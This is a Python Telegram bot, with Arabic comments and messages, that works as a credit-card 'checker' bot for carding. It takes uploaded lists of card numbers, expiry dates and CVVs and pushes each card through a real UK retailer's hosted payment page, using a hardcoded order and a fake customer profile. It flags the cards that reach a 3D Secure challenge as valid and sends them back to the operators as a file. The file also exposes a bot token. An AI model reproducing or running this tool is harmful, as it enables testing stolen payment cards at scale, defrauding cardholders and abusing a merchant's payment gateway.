import os
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
import requests
from bs4 import BeautifulSoup
import json
import time

# ========== الإعدادات ==========
BOT_TOKEN = "7458997340:AAEKGFvkALm5usoFBvKdbGEs4b2dz5iSwtw"
ADMIN_IDS = [5895491379, 844663875]

# ========== إحصائيات ==========
stats = {
    'total': 0,
    'checking': 0,
    'success_3ds': 0,
    'failed': 0,
    'errors': 0,
    'start_time': None,
    'is_running': False,
    'dashboard_message_id': None,
    'chat_id': None,
    'current_card': '',
    'last_response': 'Waiting...',
    'cards_checked': 0,
    'success_cards': [],
}

# ========== Card Checker Class ==========
class CardChecker:
    def __init__(self):
        self.session = requests.Session()
        
    def check(self, card_line):
        """فحص بطاقة واحدة"""
        try:
            # تقسيم البيانات
            parts = card_line.strip().split('|')
            if len(parts) != 4:
                return "ERROR", "تنسيق خاطئ"
            
            ccnum, month, year, cvv = parts
            
            # الخطوة 1: الحصول على GUID
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            
            data = {
    'PAYER_EXIST': '0',
    'OFFER_SAVE_CARD': '1',
    'CARD_STORAGE_ENABLE': '1',
    'HPP_VERSION': '2',
    'MERCHANT_RESPONSE_URL': 'https://www.dobies.co.uk/realex/new-return.cfm',
    'NEWSYSTEM': '1',
    'RETURN_TSS': '1',
    'WEB_ORDER_ID': '23617090',
    'SITE': 'DESKTOP',
    'AGENT': 'Mozilla%2F5%2E0%20%28Windows%20NT%2010%2E0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537%2E36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F142%2E0%2E0%2E0%20Safari%2F537%2E36',
    'MERCHANT_ID': 'bvgairflo',
    'ORDER_ID': '672A465B-F27E-EF7C-2D36A64037CAF0E6',
    'USER_ID': '5187954',
    'ACCOUNT': 'suttonsdobiesecomm',
    'AMOUNT': '2697',
    'DISCOUNT': '0',
    'CURRENCY': 'GBP',
    'TIMESTAMP': '20251116011118',
    'SHA1HASH': '94253713707519eb30681976a8af39e3274938ba',
    'AUTO_SETTLE_FLAG': '1',
    'SHOP': 'www.dobies.co.uk',
    'SHOPREF': '112',
    'VAR_REF': '5187954',
    'USER_FNAME': 'saad',
    'USER_LNAME': 'saad',
    'USER_EMAIL': 'kwajhg09b3@yzcalo.com',
    'USER_PHONE': '66576885695',
    'HPP_CUSTOMER_EMAIL': 'kwajhg09b3@yzcalo.com',
    'HPP_BILLING_STREET1': '11 Littlejohn Street',
    'HPP_BILLING_STREET2': '',
    'HPP_BILLING_STREET3': '',
    'HPP_BILLING_CITY': 'Aberdeen',
    'HPP_BILLING_POSTALCODE': 'AB101FG',
    'HPP_BILLING_COUNTRY': '826',
    'HPP_ADDRESS_MATCH_INDICATOR': 'FALSE',
    'HPP_CHALLENGE_REQUEST_INDICATOR': 'CHALLENGE_MANDATED',
        }

            
            response = self.session.post('https://hpp.globaliris.com/pay', headers=headers, data=data, timeout=15)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            guid_input = soup.find('input', {'name': 'guid'})
            if not guid_input:
                return "ERROR", "لم يتم الحصول على GUID"
            
            guid = guid_input.get('value')
            
            # الخطوة 2: فتح صفحة البطاقة
            card_page_url = f"https://hpp.globaliris.com/hosted-payments/blue/card.html?guid={guid}"
            self.session.get(card_page_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
            
            # الخطوة 3: التحقق من 3DS
            headers_xhr = {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': 'Mozilla/5.0',
                'Referer': card_page_url,
            }
            
            verify_data = {
                'pas_cctype': '',
                'pas_ccnum': ccnum,
                'pas_expiry': '',
                'pas_cccvc': '',
                'pas_ccname': '',
                'guid': guid,
            }
            
            verify_response = self.session.post(
                'https://hpp.globaliris.com/hosted-payments/blue/3ds2/verifyEnrolled',
                headers=headers_xhr,
                data=verify_data,
                timeout=15
            )
            
            verify_result = verify_response.json()
            enrolled = verify_result.get('enrolled', False)
            
            if not enrolled:
                return "FAILED", "غير مسجلة في 3DS"
            
            method_url = verify_result.get('method_url')
            method_data = verify_result.get('method_data', {})
            
            # الخطوة 4: تنفيذ 3DS Method والانتظار
            method_completion_indicator = 'U'
            
            if method_url and method_data:
                try:
                    encoded_method_data = method_data.get('encoded_method_data')
                    method_response = self.session.post(
                        method_url,
                        data={'threeDSMethodData': encoded_method_data},
                        headers={'Content-Type': 'application/x-www-form-urlencoded'},
                        timeout=10
                    )
                    if method_response.status_code == 200:
                        method_completion_indicator = 'Y'
                    else:
                        method_completion_indicator = 'N'
                except:
                    method_completion_indicator = 'U'
                
                time.sleep(2)
            
            # الخطوة 5: إرسال بيانات البطاقة
            full_card_data = {
                'pas_cctype': '',
                'verifyResult': json.dumps(verify_result),
                'verifyEnrolled': 'Y',
                'pas_ccnum': ccnum,
                'pas_expiry': f"{month}/{year[-2:]}",
                'pas_cccvc': cvv,
                'pas_ccname': 'TEST',
                'guid': guid,
                'browserJavaEnabled': 'false',
                'browserLanguage': 'en',
                'screenColorDepth': '24',
                'screenHeight': '1080',
                'screenWidth': '1920',
                'timezoneUtcOffset': '-120',
                'threeDSMethodCompletionInd': method_completion_indicator,
            }
            
            auth_response = self.session.post(
                'https://hpp.globaliris.com/hosted-payments/blue/api/auth',
                headers=headers_xhr,
                data=full_card_data,
                timeout=15
            )
            
            content_type = auth_response.headers.get('Content-Type', '')
            
            if 'html' in content_type.lower() or auth_response.text.strip().startswith('<'):
                if 'error processing your payment' in auth_response.text.lower():
                    return "FAILED", "خطأ في معالجة الدفع"
                return "ERROR", "استجابة HTML غير متوقعة"
            
            try:
                auth_result = auth_response.json()
            except json.JSONDecodeError:
                return "ERROR", "استجابة غير صالحة"
            
            data_obj = auth_result.get('data', {})
            verify_enrolled_result = data_obj.get('verifyEnrolledResult', {})
            
            # فحص النجاح
            if verify_enrolled_result and verify_enrolled_result.get('challengeRequestUrl'):
                challenge_url = verify_enrolled_result.get('challengeRequestUrl', '')
                return "SUCCESS", f"🤖 MAHMOUD SAAD 🤖"
            
            if verify_result.get('challenge_request_url'):
                challenge_url = verify_result.get('challenge_request_url', '')
                return "SUCCESS", f"🤖 MAHMOUD SAAD 🤖"
            
            status = auth_result.get('status', 'unknown')
            result_code = data_obj.get('response', {}).get('result', status)
            
            return "FAILED", result_code
                
        except requests.Timeout:
            return "ERROR", "انتهى الوقت"
        except requests.RequestException as e:
            return "ERROR", str(e)[:30]
        except Exception as e:
            return "ERROR", str(e)[:30]

async def send_result(bot_app, card, status_type, message):
    try:
        card_number = stats['success_3ds'] + stats['failed']
        
        if status_type == 'SUCCESS':
            text = (
                "╔═══════════════════╗\n"
                "✅ **3D SECURE SUCCESS** ✅\n"
                "╚═══════════════════╝\n\n"
                f"💳 `{card}`\n"
                f"🔥 Status: **نجح 3D Secure**\n"
                f"📊 Card #{card_number}\n"
                f"🔗 {message}\n"
                "╚═══════════════════╝"
            )
            stats['success_cards'].append(card)
            
            await bot_app.bot.send_message(
                chat_id=stats['chat_id'],
                text=text,
                parse_mode='Markdown'
            )
    except Exception as e:
        print(f"[!] Error: {e}")

async def check_card(card, bot_app):
    if not stats['is_running']:
        return card, "STOPPED", "تم الإيقاف"
    
    parts = card.strip().split('|')
    if len(parts) != 4:
        stats['errors'] += 1
        stats['checking'] -= 1
        stats['last_response'] = 'Format Error'
        await update_dashboard(bot_app)
        return card, "ERROR", "صيغة خاطئة"
    
    try:
        if not stats['is_running']:
            stats['checking'] -= 1
            return card, "STOPPED", "تم الإيقاف"
        
        checker = CardChecker()
        status, message = checker.check(card)
        
        if status == 'SUCCESS':
            stats['success_3ds'] += 1
            stats['checking'] -= 1
            stats['last_response'] = '3DS Success ✅'
            await update_dashboard(bot_app)
            await send_result(bot_app, card, "SUCCESS", message)
            return card, "SUCCESS", message
            
        elif status == 'FAILED':
            stats['failed'] += 1
            stats['checking'] -= 1
            stats['last_response'] = 'Failed ❌'
            await update_dashboard(bot_app)
            return card, "FAILED", message
            
        else:
            stats['errors'] += 1
            stats['checking'] -= 1
            stats['last_response'] = f'Error: {message[:20]}'
            await update_dashboard(bot_app)
            return card, "ERROR", message
            
    except Exception as e:
        stats['errors'] += 1
        stats['checking'] -= 1
        stats['last_response'] = f'Error: {str(e)[:20]}'
        await update_dashboard(bot_app)
        return card, "EXCEPTION", str(e)

def create_dashboard_keyboard():
    elapsed = 0
    if stats['start_time']:
        elapsed = int((datetime.now() - stats['start_time']).total_seconds())
    mins, secs = divmod(elapsed, 60)
    hours, mins = divmod(mins, 60)
    
    keyboard = [
        [InlineKeyboardButton(f"🔥 الإجمالي: {stats['total']}", callback_data="total")],
        [
            InlineKeyboardButton(f"🔄 يتم الفحص: {stats['checking']}", callback_data="checking"),
            InlineKeyboardButton(f"⏱ {hours:02d}:{mins:02d}:{secs:02d}", callback_data="time")
        ],
        [
            InlineKeyboardButton(f"✅ نجح 3DS: {stats['success_3ds']}", callback_data="success"),
            InlineKeyboardButton(f"❌ فشل: {stats['failed']}", callback_data="failed")
        ],
        [
            InlineKeyboardButton(f"⚠️ أخطاء: {stats['errors']}", callback_data="errors")
        ],
        [
            InlineKeyboardButton(f"📡 {stats['last_response']}", callback_data="response")
        ]
    ]
    
    if stats['is_running']:
        keyboard.append([InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_check")])
    
    if stats['current_card']:
        keyboard.append([InlineKeyboardButton(f"🔄 {stats['current_card']}", callback_data="current")])
    
    return InlineKeyboardMarkup(keyboard)

async def update_dashboard(bot_app):
    if stats['dashboard_message_id'] and stats['chat_id']:
        try:
            await bot_app.bot.edit_message_text(
                chat_id=stats['chat_id'],
                message_id=stats['dashboard_message_id'],
                text="📊 **3D SECURE CHECKER - LIVE** 📊",
                reply_markup=create_dashboard_keyboard(),
                parse_mode='Markdown'
            )
        except:
            pass

async def send_final_files(bot_app):
    try:
        if stats['success_cards']:
            success_text = "\n".join(stats['success_cards'])
            with open("success_3ds_cards.txt", "w") as f:
                f.write(success_text)
            await bot_app.bot.send_document(
                chat_id=stats['chat_id'],
                document=open("success_3ds_cards.txt", "rb"),
                caption=f"✅ **3D Secure Success Cards** ({len(stats['success_cards'])} cards)",
                parse_mode='Markdown'
            )
            os.remove("success_3ds_cards.txt")
        
    except Exception as e:
        print(f"[!] خطأ في إرسال الملفات: {e}")

async def start(update: Update,context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
        return
    
    keyboard = [[InlineKeyboardButton("📁 إرسال ملف البطاقات", callback_data="send_file")]]
    await update.message.reply_text(
        "📊 **3D SECURE CHECKER BOT**\n\n"
        "أرسل ملف .txt يحتوي على البطاقات\n"
        "الصيغة: `رقم|شهر|سنة|cvv`\n\n"
        "**الردود المتاحة:**\n"
        "✅ نجح 3D Secure\n"
        "❌ فشل\n"
        "⚠️ أخطاء",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح")
        return
    
    if stats['is_running']:
        await update.message.reply_text("⚠️ يوجد فحص جاري!")
        return
    
    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]
    
    stats.update({
        'total': len(cards),
        'checking': 0,
        'success_3ds': 0,
        'failed': 0,
        'errors': 0,
        'current_card': '',
        'last_response': 'Starting...',
        'cards_checked': 0,
        'success_cards': [],
        'start_time': datetime.now(),
        'is_running': True,
        'chat_id': update.effective_chat.id
    })
    
    dashboard_msg = await update.message.reply_text(
        text="📊 **3D SECURE CHECKER - LIVE** 📊",
        reply_markup=create_dashboard_keyboard(),
        parse_mode='Markdown'
    )
    stats['dashboard_message_id'] = dashboard_msg.message_id
    
    await update.message.reply_text(
        f"✅ تم بدء الفحص!\n\n"
        f"📊 إجمالي البطاقات: {len(cards)}\n"
        f"🔄 جاري الفحص...",
        parse_mode='Markdown'
    )
    
    asyncio.create_task(process_cards(cards, context.application))

async def process_cards(cards, bot_app):
    for i, card in enumerate(cards):
        if not stats['is_running']:
            stats['last_response'] = 'Stopped by user 🛑'
            await update_dashboard(bot_app)
            break
        
        stats['checking'] = 1
        parts = card.split('|')
        stats['current_card'] = f"{parts[0][:6]}****{parts[0][-4:]}" if len(parts) > 0 else card[:10]
        await update_dashboard(bot_app)
        
        await check_card(card, bot_app)
        stats['cards_checked'] += 1
        
        if stats['cards_checked'] % 5 == 0:
            await update_dashboard(bot_app)
        
        await asyncio.sleep(2)
    
    stats['is_running'] = False
    stats['checking'] = 0
    stats['current_card'] = ''
    stats['last_response'] = 'Completed ✅'
    await update_dashboard(bot_app)
    
    summary_text = (
        "═══════════════════\n"
        "✅ **اكتمل الفحص!** ✅\n"
        "═══════════════════\n\n"
        f"📊 **الإحصائيات النهائية:**\n"
        f"🔥 الإجمالي: {stats['total']}\n"
        f"✅ نجح 3DS: {stats['success_3ds']}\n"
        f"❌ فشل: {stats['failed']}\n"
        f"⚠️ أخطاء: {stats['errors']}\n\n"
        "📁 **جاري إرسال الملفات...**"
    )
    
    await bot_app.bot.send_message(
        chat_id=stats['chat_id'],
        text=summary_text,
        parse_mode='Markdown'
    )
    
    await send_final_files(bot_app)
    
    final_text = (
        "╔═══════════════════╗\n"
        "🎉 **تم إنهاء العملية بنجاح!** 🎉\n"
        "╚═══════════════════╝\n\n"
        "✅ تم إرسال جميع الملفات\n"
        "📊 شكراً لاستخدامك البوت!\n\n"
        "⚡️ 3D Secure Gateway"
    )
    
    await bot_app.bot.send_message(
        chat_id=stats['chat_id'],
        text=final_text,
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
        return

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    
    if query.from_user.id not in ADMIN_IDS:
        await query.answer("❌ غير مصرح", show_alert=True)
        return
    
    try:
        await query.answer()
    except:
        pass
    
    if query.data == "stop_check":
        if stats['is_running']:
            stats['is_running'] = False
            stats['checking'] = 0
            stats['last_response'] = 'Stopped 🛑'
            await update_dashboard(context.application)
            try:
                await context.application.bot.send_message(
                    chat_id=stats['chat_id'],
                    text="🛑 **تم إيقاف الفحص بواسطة المستخدم!**",
                    parse_mode='Markdown'
                )
            except:
                pass

def main():
    print("[🤖] Starting 3D Secure Telegram Bot...")
    print("[✅] Bot will send results in chat")
    print("[✅] Using asyncio.create_task")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    print("[✅] Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
